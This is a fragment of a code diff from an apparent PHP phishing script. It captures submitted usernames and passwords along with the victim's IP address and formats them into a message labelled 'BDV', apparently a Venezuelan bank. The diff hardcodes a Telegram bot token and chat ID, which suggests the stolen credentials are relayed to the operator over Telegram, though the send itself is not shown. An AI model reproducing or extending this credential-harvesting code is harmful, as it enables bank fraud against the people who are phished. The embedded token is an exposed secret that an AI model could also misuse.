@@ -8,8 +8,8 @@ $password = $_POST['password'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $fecha = date('Y-m-d H:i:s');
 
-$token = getenv('TELEGRAM_TOKEN');
-$chat_id = getenv('TELEGRAM_CHAT_ID');
+$token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
+$chat_id = "6912929677";
 
 $mensaje = "🏦 BDV\n";
 $mensaje .= "👤 Usuario: $usuario\n";
